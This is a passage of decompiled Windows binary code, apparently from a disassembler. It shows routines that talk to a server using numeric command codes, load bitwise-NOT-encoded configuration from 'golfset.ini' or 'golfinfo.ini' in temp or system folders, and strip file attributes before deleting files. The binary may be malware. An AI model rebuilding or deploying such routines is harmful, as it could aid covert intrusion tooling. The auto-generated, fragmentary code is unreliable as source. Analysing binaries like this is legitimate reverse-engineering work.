  local_4 = DAT_00422044 ^ (uint)auStack_8;
  if (unaff_EBX[1] != 0) {
    if (unaff_EBX[1] != -1) {
      FUN_00409590();
      param_2 = extraout_EDX;
    }
    unaff_EBX[1] = -1;
    if (*(int *)(*unaff_EBX + 4) < 1) {
      FUN_0040a982(local_4 ^ (uint)auStack_8,param_2);
      return;
    }
    if (0 < *(int *)(*unaff_EBX + 0x10)) {
      FUN_00408ed0();
    }
    iVar2 = *(int *)(*unaff_EBX + 0x10);
    while (iVar2 < 0) {
      iVar2 = *unaff_EBX;
      if (((iVar2 != 0) && (*(int *)(iVar2 + 0x18) != 0)) &&
         (iVar1 = *(int *)(iVar2 + 0x10) + 1, iVar1 != *(int *)(iVar2 + 4))) {
        *(int *)(iVar2 + 0x14) =
             *(int *)(iVar2 + 0x14) +
             *(int *)(iVar2 + 0x50) + *(int *)(iVar2 + 0x4c) + 0x2e + *(int *)(iVar2 + 0x48);
        *(int *)(iVar2 + 0x10) = iVar1;
        iVar1 = FUN_00408a80((int *)(iVar2 + 0x28),(uint *)(iVar2 + 0x78),(undefined4 *)0x0,0);
        *(uint *)(iVar2 + 0x18) = (uint)(iVar1 == 0);
      }
      iVar2 = *(int *)(*unaff_EBX + 0x10);
    }
    FUN_004091a0((char *)unaff_EBX[0x8f]);
    unaff_EBX[1] = 0;
  }
  iVar2 = FUN_00409320(param_4,param_3,&local_5);
  uVar3 = extraout_EDX_00;
  if (iVar2 < 1) {
    FUN_00409590();
    unaff_EBX[1] = -1;
    uVar3 = extraout_EDX_01;
  }
  if (local_5 == '\0') {
    if (iVar2 < 1) {
      FUN_0040a982(local_4 ^ (uint)auStack_8,uVar3);
      return;
    }
    FUN_0040a982(local_4 ^ (uint)auStack_8,uVar3);
    return;
  }
  FUN_0040a982(local_4 ^ (uint)auStack_8,uVar3);
  return;
}



void FUN_00409ed0(void)

{
  int *piVar1;
  int iVar2;
  int **unaff_ESI;
  
  if (unaff_ESI[1] != (int *)0xffffffff) {
    FUN_00409590();
  }
  piVar1 = *unaff_ESI;
  unaff_ESI[1] = (int *)0xffffffff;
  if (piVar1 != (int *)0x0) {
    if (piVar1[0x1f] != 0) {
      FUN_00409590();
    }
    iVar2 = *piVar1;
    if (iVar2 != 0) {
      if (*(char *)(iVar2 + 0x10) != '\0') {
        CloseHandle(*(HANDLE *)(iVar2 + 4));
      }
      FUN_0040b6ac();
    }
    FUN_0040b61e();
  }
  *unaff_ESI = (int *)0x0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_00409f30(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int **unaff_FS_OFFSET;
  int *local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041bc1b;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int *)&local_c;
  iVar1 = FUN_0040b8c1(0x44c);
  local_4 = 0;
  if (iVar1 == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = FUN_00409690();
  }
  local_4 = 0xffffffff;
  _DAT_00425358 = FUN_004096f0(param_1,param_2);
  if (_DAT_00425358 != 0) {
    if (iVar1 != 0) {
      FUN_00409fe0();
    }
    *unaff_FS_OFFSET = local_c;
    return (undefined4 *)0x0;
  }
  puVar2 = (undefined4 *)FUN_0040b8c1(8);
  *puVar2 = 1;
  puVar2[1] = iVar1;
  *unaff_FS_OFFSET = local_c;
  return puVar2;
}



void FUN_00409fe0(void)

{
  int unaff_ESI;
  
  if (*(int *)(unaff_ESI + 0x23c) != 0) {
    FUN_0040b6ac();
  }
  *(undefined4 *)(unaff_ESI + 0x23c) = 0;
  if (*(int *)(unaff_ESI + 0x240) != 0) {
    FUN_0040b6ac();
  }
  *(undefined4 *)(unaff_ESI + 0x240) = 0;
  FUN_0040b6ac();
  return;
}



void __fastcall FUN_0040a030(undefined4 param_1,undefined param_2,undefined4 param_3)

{
  short *psVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  int iVar4;
  undefined4 extraout_EDX;
  undefined4 uVar5;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  ushort uVar6;
  undefined4 *puVar7;
  uint uVar8;
  undefined4 *puVar9;
  undefined8 uVar10;
  undefined4 local_c18;
  uint local_c14;
  int local_c10;
  uint local_c0c;
  short local_c08;
  undefined local_c06 [2046];
  undefined4 local_408 [257];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_c18;
  local_c18 = 0;
  puVar7 = &DAT_00425568;
  puVar9 = local_408;
  for (iVar4 = 0x80; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar9 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar9 = puVar9 + 1;
  }
  pauVar2 = (undefined (*) [16])FUN_0040afc0(0x10000);
  FUN_0040f8c0(pauVar2,0,0x10000);
  local_c0c = 0x10000;
  local_c08 = 0;
  FUN_0040f8c0((undefined (*) [16])local_c06,0,0x7fe);
  local_c10 = 0;
  local_c14 = 0;
  uVar10 = FUN_00405540(&local_c08,param_1);
  uVar5 = (undefined4)((ulonglong)uVar10 >> 0x20);
  if ((int)uVar10 == 0) {
    local_c18 = 1;
  }
  else {
    uVar10 = FUN_00405780(local_408,&local_c10,0xbb9,0x200,&local_c08);
    uVar5 = (undefined4)((ulonglong)uVar10 >> 0x20);
    if ((int)uVar10 == 0) {
      local_c18 = 3;
    }
    else {
      if (pauVar2 == (undefined (*) [16])0x0) goto LAB_0040a209;
      uVar10 = FUN_00405ac0(pauVar2,&local_c10,(undefined2 *)&local_c14,&local_c0c,&local_c08);
      uVar8 = local_c0c;
      uVar5 = (undefined4)((ulonglong)uVar10 >> 0x20);
      if ((((int)uVar10 == 0) || ((short)local_c14 != 0xbb9)) || (local_c0c == 0)) {
        local_c18 = 2;
      }
      else {
        FUN_0040f8c0((undefined (*) [16])&DAT_00424720,0,0x578);
        uVar6 = 0;
        local_c14 = 0;
        uVar5 = extraout_EDX;
        if (0x117 < (int)uVar8) {
          uVar3 = 0;
          do {
            psVar1 = (short *)(*pauVar2 + uVar3);
            if ((*(short *)(*pauVar2 + uVar3) != 0) && (uVar6 < 5)) {
              uVar8 = (uint)uVar6;
              FUN_0040aa6e(&DAT_00424720 + uVar8 * 0x8c,0x7f,psVar1);
              FUN_0040c264((undefined (*) [16])(&DAT_00424824 + uVar8 * 0x46),0x14,
                           (undefined4 *)(psVar1 + 0x82),0x14);
              uVar5 = *(undefined4 *)(psVar1 + 0x80);
              (&DAT_00424820)[uVar8 * 0x46] = uVar5;
              uVar6 = uVar6 + 1;
              uVar8 = local_c0c;
            }
            local_c14 = local_c14 + 0x118;
            uVar3 = local_c14 & 0xffff;
          } while ((int)(uVar3 + 0x118) <= (int)uVar8);
        }
      }
    }
  }
  if (pauVar2 != (undefined (*) [16])0x0) {
    FUN_0040b61e();
    uVar5 = extraout_EDX_00;
  }
LAB_0040a209:
  if (local_c10 != 0) {
    Ordinal_3(local_c10);
    uVar5 = extraout_EDX_01;
  }
  FUN_0040a982(local_4 ^ (uint)&local_c18,uVar5);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_0040a240(void *this,undefined4 param_1)

{
  short sVar1;
  undefined (*pauVar2) [16];
  short *psVar3;
  int iVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar5;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined8 uVar8;
  int local_102c;
  int local_1028;
  uint local_1024;
  undefined4 local_1020;
  short local_101c;
  undefined local_101a [518];
  WCHAR local_e14 [260];
  undefined local_c0c [1024];
  short local_80c;
  undefined local_80a [2050];
  uint local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x40a24a;
  local_8 = DAT_00422044 ^ (uint)&local_102c;
  local_1020 = param_1;
  FUN_0040f8c0((undefined (*) [16])local_c0c,0,0x400);
  FUN_0040aa6e((short *)local_c0c,0x1ff,(short *)this);
  psVar3 = (short *)this;
  do {
    sVar1 = *psVar3;
    psVar3 = psVar3 + 1;
  } while (sVar1 != 0);
  puVar6 = &DAT_00425568;
  puVar7 = (undefined4 *)(local_c0c + ((int)psVar3 - ((int)this + 2) >> 1) * 2 + 2);
  for (iVar4 = 0x80; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  iVar4 = (int)this + 2;
  do {
                    // WARNING: Load size is inaccurate
    sVar1 = *this;
    this = (void *)((int)this + 2);
  } while (sVar1 != 0);
  pauVar2 = (undefined (*) [16])FUN_0040afc0(0x10000);
  FUN_0040f8c0(pauVar2,0,0x10000);
  local_1024 = 0x10000;
  local_80c = 0;
  FUN_0040f8c0((undefined (*) [16])local_80a,0,0x7fe);
  local_1028 = 0;
  local_102c = 0;
  local_101c = 0;
  FUN_0040f8c0((undefined (*) [16])local_101a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,local_e14,0x104);
  psVar3 = FUN_0040a991(local_e14,0x5c);
  *psVar3 = 0;
  FUN_0040aa6e(&local_101c,0x104,local_e14);
  FUN_0040a9bd(&local_101c,0x103,(short *)&DAT_0041dc88);
  uVar8 = FUN_00405540(&local_80c,local_1020);
  uVar5 = (undefined4)((ulonglong)uVar8 >> 0x20);
  if ((int)uVar8 != 0) {
    uVar8 = FUN_00405780((undefined4 *)local_c0c,&local_1028,0xbba,
                         ((int)this - iVar4 >> 1) * 2 + 0x202,&local_80c);
    uVar5 = (undefined4)((ulonglong)uVar8 >> 0x20);
    if ((int)uVar8 != 0) {
      uVar8 = FUN_00405ac0(pauVar2,&local_1028,(undefined2 *)&local_102c,&local_1024,&local_80c);
      uVar5 = (undefined4)((ulonglong)uVar8 >> 0x20);
      if (((((int)uVar8 != 0) && ((short)local_102c == 0xbba)) && (local_1024 != 0)) &&
         ((*pauVar2)[0] == '\0')) {
        FUN_0040a9bd(&local_101c,0x104,(short *)&DAT_00425360);
        local_102c = 0;
        _DAT_0042471c = 0;
        FUN_0040ac04(&local_102c);
        uVar5 = extraout_EDX;
        if (local_102c != 0) {
          FUN_00405c80(&local_102c);
          uVar5 = extraout_EDX_00;
        }
      }
    }
  }
  if (pauVar2 != (undefined (*) [16])0x0) {
    FUN_0040b61e();
    uVar5 = extraout_EDX_01;
  }
  if (local_1028 != 0) {
    Ordinal_3(local_1028);
    uVar5 = extraout_EDX_02;
  }
  FUN_0040a982(local_8 ^ (uint)&local_102c,uVar5);
  return;
}



void FUN_0040a4c0(void)

{
  short *psVar1;
  short *psVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar3;
  int unaff_EDI;
  int local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_214;
  local_20c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_20a,0,0x206);
  if (unaff_EDI != 0) {
    local_214[0] = 0;
    psVar1 = &DAT_0041de30;
    do {
      psVar2 = psVar1;
      psVar1 = psVar2 + 1;
    } while (*psVar2 != 0);
    if ((int)(psVar2 + -0x20ef18) >> 1 == 0) {
      GetTempPathW(0x104,&local_20c);
      FUN_0040a9bd(&local_20c,0x104,u_golfinfo_ini_0041fff4);
      FUN_0040ac04(local_214);
      uVar3 = extraout_EDX_01;
    }
    else {
      FUN_0040ac04(local_214);
      uVar3 = extraout_EDX_00;
    }
    if (local_214[0] != 0) {
      FUN_0040b59c();
      FUN_0040b3be();
      uVar3 = extraout_EDX_02;
    }
    FUN_0040a982(local_4 ^ (uint)local_214,uVar3);
    return;
  }
  FUN_0040a982(local_4 ^ (uint)local_214,extraout_EDX);
  return;
}



void FUN_0040a5c0(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  wchar_t *extraout_EDX;
  wchar_t *extraout_EDX_00;
  undefined4 extraout_EDX_01;
  wchar_t *pwVar3;
  int unaff_ESI;
  int local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_214;
  local_20c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_20a,0,0x206);
  local_214[0] = 0;
  pwVar3 = extraout_EDX;
  if (unaff_ESI != 0) {
    pwVar3 = u_golfset_ini_0041dd3c + 1;
    pwVar1 = u_golfset_ini_0041dd3c;
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x20ee9e) >> 1 != 0) {
      if (DAT_00423070 == 3) {
        GetSystemDirectoryW(&local_20c,0x104);
        FUN_0040a9bd(&local_20c,0x104,(short *)&DAT_0041dc88);
      }
      else {
        GetTempPathW(0x104,&local_20c);
      }
      FUN_0040a9bd(&local_20c,0x104,u_golfset_ini_0041dd3c);
      FUN_0040ac04(local_214);
      pwVar3 = extraout_EDX_00;
      if (local_214[0] != 0) {
        FUN_0040b32a(unaff_ESI,0x200,1,local_214[0]);
        FUN_0040b3be();
        FUN_0040a982(local_4 ^ (uint)local_214,extraout_EDX_01);
        return;
      }
    }
  }
  FUN_0040a982(local_4 ^ (uint)local_214,pwVar3);
  return;
}



void FUN_0040a6e0(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  wchar_t *extraout_EDX;
  wchar_t *extraout_EDX_00;
  undefined4 extraout_EDX_01;
  wchar_t *pwVar3;
  int unaff_ESI;
  int local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_214;
  local_20c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_20a,0,0x206);
  local_214[0] = 0;
  pwVar3 = extraout_EDX;
  if (unaff_ESI != 0) {
    pwVar3 = u_golfinfo_ini_0041fff4 + 1;
    pwVar1 = u_golfinfo_ini_0041fff4;
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x20fffa) >> 1 != 0) {
      GetTempPathW(0x104,&local_20c);
      FUN_0040a9bd(&local_20c,0x104,u_golfinfo_ini_0041fff4);
      FUN_0040ac04(local_214);
      pwVar3 = extraout_EDX_00;
      if (local_214[0] != 0) {
        FUN_0040b32a(unaff_ESI,0x200,1,local_214[0]);
        FUN_0040b3be();
        FUN_0040a982(local_4 ^ (uint)local_214,extraout_EDX_01);
        return;
      }
    }
  }
  FUN_0040a982(local_4 ^ (uint)local_214,pwVar3);
  return;
}



void __fastcall FUN_0040a7d0(undefined4 param_1,undefined4 param_2,int param_3)

{
  uint uVar1;
  undefined4 extraout_EDX;
  undefined4 *unaff_EDI;
  undefined8 uVar2;
  undefined auStack_20c [4];
  int local_208 [129];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)auStack_20c;
  if (unaff_EDI != (undefined4 *)0x0) {
    FUN_0040f8c0((undefined (*) [16])local_208,0,0x200);
    if (param_3 == 0) {
      uVar2 = FUN_0040a5c0();
    }
    else {
      uVar2 = FUN_0040a6e0();
    }
    param_2 = (undefined4)((ulonglong)uVar2 >> 0x20);
    if ((int)uVar2 != 0) {
      uVar1 = 0;
      do {
        *(byte *)((int)local_208 + uVar1) = ~*(byte *)((int)local_208 + uVar1);
        uVar1 = uVar1 + 1;
      } while (uVar1 < 0x200);
      if (local_208[0] == 0x504d534d) {
        FUN_0040c2f0(unaff_EDI,local_208,0x200);
        FUN_0040a982(local_4 ^ (uint)auStack_20c,extraout_EDX);
        return;
      }
    }
  }
  FUN_0040a982(local_4 ^ (uint)auStack_20c,param_2);
  return;
}



void __fastcall FUN_0040a880(undefined4 param_1,undefined4 param_2,int *param_3)

{
  uint uVar1;
  undefined4 extraout_EDX;
  undefined auStack_20c [4];
  undefined4 local_208 [129];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)auStack_20c;
  if ((param_3 != (int *)0x0) && (*param_3 == 0x504d534d)) {
    FUN_0040c2f0(local_208,param_3,0x200);
    uVar1 = 0;
    do {
      *(byte *)((int)local_208 + uVar1) = ~*(byte *)((int)local_208 + uVar1);
      uVar1 = uVar1 + 1;
    } while (uVar1 < 0x200);
    FUN_0040a4c0();
    FUN_0040a982(local_4 ^ (uint)auStack_20c,extraout_EDX);
    return;
  }
  FUN_0040a982(local_4 ^ (uint)auStack_20c,param_2);
  return;
}



HANDLE FUN_0040a910(void)

{
  DWORD DVar1;
  BOOL BVar2;
  HANDLE pvVar3;
  LPCWSTR unaff_ESI;
  
  DVar1 = GetFileAttributesW(unaff_ESI);
  if (DVar1 != 0xffffffff) {
    DVar1 = GetFileAttributesW(unaff_ESI);
    if (DVar1 != 0xffffffff) {
      if ((DVar1 & 1) != 0) {
        DVar1 = DVar1 ^ 1;
      }
      if ((DVar1 & 4) != 0) {
        DVar1 = DVar1 ^ 4;
      }
      if ((DVar1 & 2) != 0) {
        DVar1 = DVar1 ^ 2;
      }
      if ((DVar1 & 0x20) != 0) {
        DVar1 = DVar1 ^ 0x20;
      }
      SetFileAttributesW(unaff_ESI,DVar1);
      BVar2 = DeleteFileW(unaff_ESI);
      GetLastError();
      if (BVar2 != 0) goto LAB_0040a963;
    }
    return (HANDLE)0xffffffff;
  }
LAB_0040a963:
  pvVar3 = CreateFileW(unaff_ESI,0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
  return pvVar3;
}



void GetAdaptersInfo(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a97c. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersInfo();
  return;
}



void __fastcall FUN_0040a982(int param_1,undefined4 param_2)

{
  undefined1 in_stack_00000004;
  
  if (param_1 == DAT_00422044) {
    return;
  }
  FUN_0040c805(param_1,param_2,in_stack_00000004);
  return;
}



short * __cdecl FUN_0040a991(short *param_1,short param_2)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  do {
    psVar2 = psVar2 + -1;
    if (psVar2 == param_1) break;
  } while (*psVar2 != param_2);
  if (*psVar2 != param_2) {
    psVar2 = (short *)0x0;
  }
  return psVar2;
}



undefined4 __cdecl FUN_0040a9bd(short *param_1,int param_2,short *param_3)

{
  short sVar1;
  undefined4 *puVar2;
  short *psVar3;
  undefined4 uStack_14;
  
  if ((param_1 != (short *)0x0) && (param_2 != 0)) {
    psVar3 = param_1;
    if (param_3 != (short *)0x0) {
      do {
        if (*psVar3 == 0) break;
        psVar3 = psVar3 + 1;
        param_2 = param_2 + -1;
      } while (param_2 != 0);
      if (param_2 != 0) {
        do {
          sVar1 = *param_3;
          *psVar3 = sVar1;
          psVar3 = psVar3 + 1;
          param_3 = param_3 + 1;
          if (sVar1 == 0) break;
          param_2 = param_2 + -1;
        } while (param_2 != 0);
        if (param_2 != 0) {
          return 0;
        }
        *param_1 = 0;
        puVar2 = (undefined4 *)FUN_0040caaa();
        uStack_14 = 0x22;
        *puVar2 = 0x22;
        goto LAB_0040a9df;
      }
    }
    *param_1 = 0;
  }
  puVar2 = (undefined4 *)FUN_0040caaa();
  uStack_14 = 0x16;
  *puVar2 = 0x16;
LAB_0040a9df:
  FUN_0040ca42();
  return uStack_14;
}



void __cdecl FUN_0040aa3a(undefined4 param_1)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = FUN_0040cdba();
  *(undefined4 *)(pauVar1[1] + 4) = param_1;
  return;
}



uint FUN_0040aa4c(void)

{
  undefined (*pauVar1) [16];
  uint uVar2;
  
  pauVar1 = FUN_0040cdba();
  uVar2 = *(int *)(pauVar1[1] + 4) * 0x343fd + 0x269ec3;
  *(uint *)(pauVar1[1] + 4) = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



undefined4 __cdecl FUN_0040aa6e(short *param_1,int param_2,short *param_3)

{
  short sVar1;
  undefined4 *puVar2;
  short *psVar3;
  undefined4 uStack_14;
  
  if ((param_1 != (short *)0x0) && (param_2 != 0)) {
    psVar3 = param_1;
    if (param_3 != (short *)0x0) {
      do {
        sVar1 = *param_3;
        *psVar3 = sVar1;
        param_3 = param_3 + 1;
        if (sVar1 == 0) break;
        param_2 = param_2 + -1;
        psVar3 = psVar3 + 1;
      } while (param_2 != 0);
      if (param_2 != 0) {
        return 0;
      }
      *param_1 = 0;
      puVar2 = (undefined4 *)FUN_0040caaa();
      uStack_14 = 0x22;
      *puVar2 = 0x22;
      goto LAB_0040aa90;
    }
    *param_1 = 0;
  }
  puVar2 = (undefined4 *)FUN_0040caaa();
  uStack_14 = 0x16;
  *puVar2 = 0x16;
LAB_0040aa90:
  FUN_0040ca42();
  return uStack_14;
}



short * __cdecl FUN_0040aadd(short *param_1,short *param_2)

{
  short sVar1;
  short *psVar2;
  int iVar3;
  
  if (*param_2 != 0) {
    sVar1 = *param_1;
    if (sVar1 != 0) {
      iVar3 = (int)param_1 - (int)param_2;
      psVar2 = param_2;
joined_r0x0040ab05:
      do {
        if (sVar1 != 0) {
          if (*psVar2 == 0) {
            return param_1;
          }
          if (*(short *)(iVar3 + (int)psVar2) == *psVar2) {
            sVar1 = *(short *)(iVar3 + (int)(psVar2 + 1));
            psVar2 = psVar2 + 1;
            goto joined_r0x0040ab05;
          }
        }
        if (*psVar2 == 0) {
          return param_1;
        }
        param_1 = param_1 + 1;
        sVar1 = *param_1;
        iVar3 = iVar3 + 2;
        psVar2 = param_2;
      } while (sVar1 != 0);
    }
    param_1 = (short *)0x0;
  }
  return param_1;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040ab3e(void)

{
  short *psVar1;
  short *psVar2;
  undefined4 *puVar3;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_004202d0,0xc);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  psVar1 = *(short **)(unaff_EBP + 8);
  if (((psVar1 == (short *)0x0) || (psVar2 = *(short **)(unaff_EBP + 0xc), psVar2 == (short *)0x0))
     || (*psVar2 == 0)) {
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0x16;
    FUN_0040ca42();
  }
  else {
    puVar3 = FUN_0040d4f9();
    *(undefined4 **)(unaff_EBP + 8) = puVar3;
    if (puVar3 == (undefined4 *)0x0) {
      puVar3 = (undefined4 *)FUN_0040caaa();
      *puVar3 = 0x18;
    }
    else {
      *(undefined4 *)(unaff_EBP + -4) = 0;
      if (*psVar1 != 0) {
        puVar3 = FUN_0040d245(psVar1,psVar2,*(undefined4 *)(unaff_EBP + 0x10),puVar3);
        *(undefined4 **)(unaff_EBP + -0x1c) = puVar3;
        *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
        FUN_0040abfa();
        return *(undefined4 *)(unaff_EBP + -0x1c);
      }
      puVar3 = (undefined4 *)FUN_0040caaa();
      *puVar3 = 0x16;
      FUN_0040d81c(&DAT_00422044,unaff_EBP + -0x10,0xfffffffe);
    }
  }
  return 0;
}



void FUN_0040abfa(void)

{
  int unaff_EBP;
  
  FUN_0040d1da(*(uint *)(unaff_EBP + 8));
  return;
}



undefined4 __cdecl FUN_0040ac04(int *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 uVar3;
  
  if (param_1 == (int *)0x0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    uVar3 = 0x16;
    *puVar1 = 0x16;
    FUN_0040ca42();
  }
  else {
    iVar2 = FUN_0040ab3e();
    *param_1 = iVar2;
    if (iVar2 == 0) {
      puVar1 = (undefined4 *)FUN_0040caaa();
      uVar3 = *puVar1;
    }
    else {
      uVar3 = 0;
    }
  }
  return uVar3;
}



int __cdecl FUN_0040ac57(char **param_1,undefined4 param_2,int param_3)

{
  char *pcVar1;
  undefined4 *puVar2;
  int iVar3;
  
  if (((uint)param_1[3] & 0x83) == 0) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    param_1[3] = (char *)((uint)param_1[3] & 0xffffffef);
    if (param_3 == 1) {
      FUN_0040ad66(param_1);
    }
    FUN_0040daf2((int *)param_1);
    pcVar1 = param_1[3];
    if ((char)pcVar1 < '\0') {
      param_1[3] = (char *)((uint)pcVar1 & 0xfffffffc);
    }
    else if (((((uint)pcVar1 & 1) != 0) && (((uint)pcVar1 & 8) != 0)) &&
            (((uint)pcVar1 & 0x400) == 0)) {
      param_1[6] = (char *)0x200;
    }
    FUN_0040dac0((int)param_1);
    iVar3 = FUN_0040d9e4();
    iVar3 = (iVar3 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040ace1(void)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_004202f0,0xc);
  if ((*(int *)(unaff_EBP + 8) == 0) ||
     (((iVar3 = *(int *)(unaff_EBP + 0x10), iVar3 != 0 && (iVar3 != 1)) && (iVar3 != 2)))) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar2 = 0xffffffff;
  }
  else {
    FUN_0040d167(*(undefined **)(unaff_EBP + 8));
    *(undefined4 *)(unaff_EBP + -4) = 0;
    iVar3 = FUN_0040ac57(*(char ***)(unaff_EBP + 8),*(undefined4 *)(unaff_EBP + 0xc),iVar3);
    *(int *)(unaff_EBP + -0x1c) = iVar3;
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_0040ad5c();
    uVar2 = *(undefined4 *)(unaff_EBP + -0x1c);
  }
  return uVar2;
}



void FUN_0040ad5c(void)

{
  int unaff_EBP;
  
  FUN_0040d1da(*(uint *)(unaff_EBP + 8));
  return;
}



int __cdecl FUN_0040ad66(char **param_1)

{
  char *pcVar1;
  undefined4 *puVar2;
  uint uVar3;
  char **ppcVar4;
  int iVar5;
  char *pcVar6;
  char **ppcVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_c;
  
  ppcVar7 = param_1;
  if (param_1 == (char **)0x0) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 0x16;
    FUN_0040ca42();
    return -1;
  }
  uVar3 = FUN_0040dac0((int)param_1);
  if ((int)param_1[1] < 0) {
    param_1[1] = (char *)0x0;
  }
  local_c = FUN_0040d9e4();
  if (local_c < 0) {
    return -1;
  }
  pcVar6 = param_1[3];
  if (((uint)pcVar6 & 0x108) == 0) {
    return local_c - (int)param_1[1];
  }
  pcVar8 = *param_1;
  pcVar1 = param_1[2];
  local_10 = (int)pcVar8 - (int)pcVar1;
  if (((uint)pcVar6 & 3) == 0) {
    if (-1 < (char)pcVar6) {
      puVar2 = (undefined4 *)FUN_0040caaa();
      *puVar2 = 0x16;
      return -1;
    }
  }
  else {
    pcVar6 = pcVar1;
    if ((*(byte *)((&DAT_004257c0)[(int)uVar3 >> 5] + 4 + (uVar3 & 0x1f) * 0x40) & 0x80) != 0) {
      for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
        if (*pcVar6 == '\n') {
          local_10 = local_10 + 1;
        }
      }
    }
  }
  if (local_c != 0) {
    if ((*(byte *)(param_1 + 3) & 1) != 0) {
      if (param_1[1] == (char *)0x0) {
        local_10 = 0;
      }
      else {
        ppcVar4 = (char **)(param_1[1] + ((int)pcVar8 - (int)pcVar1));
        iVar9 = (uVar3 & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_004257c0)[(int)uVar3 >> 5] + 4 + iVar9) & 0x80) != 0) {
          iVar5 = FUN_0040d9e4();
          if (iVar5 == local_c) {
            pcVar6 = param_1[2];
            pcVar8 = (char *)((int)ppcVar4 + (int)pcVar6);
            param_1 = ppcVar4;
            for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
              if (*pcVar6 == '\n') {
                param_1 = (char **)((int)param_1 + 1);
              }
            }
            bVar10 = ((uint)ppcVar7[3] & 0x2000) == 0;
          }
          else {
            iVar5 = FUN_0040d9e4();
            if (iVar5 < 0) {
              return -1;
            }
            ppcVar7 = (char **)0x200;
            if ((((char **)0x200 < ppcVar4) || (((uint)param_1[3] & 8) == 0)) ||
               (((uint)param_1[3] & 0x400) != 0)) {
              ppcVar7 = (char **)param_1[6];
            }
            bVar10 = (*(byte *)((&DAT_004257c0)[(int)uVar3 >> 5] + 4 + iVar9) & 4) == 0;
            param_1 = ppcVar7;
          }
          ppcVar4 = param_1;
          if (!bVar10) {
            ppcVar4 = (char **)((int)param_1 + 1);
          }
        }
        param_1 = ppcVar4;
        local_c = local_c - (int)param_1;
      }
    }
    return local_10 + local_c;
  }
  return local_10;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040af03(void)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420310,0xc);
  if (*(int *)(unaff_EBP + 8) == 0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar2 = 0xffffffff;
  }
  else {
    FUN_0040d167(*(undefined **)(unaff_EBP + 8));
    *(undefined4 *)(unaff_EBP + -4) = 0;
    iVar3 = FUN_0040ad66(*(char ***)(unaff_EBP + 8));
    *(int *)(unaff_EBP + -0x1c) = iVar3;
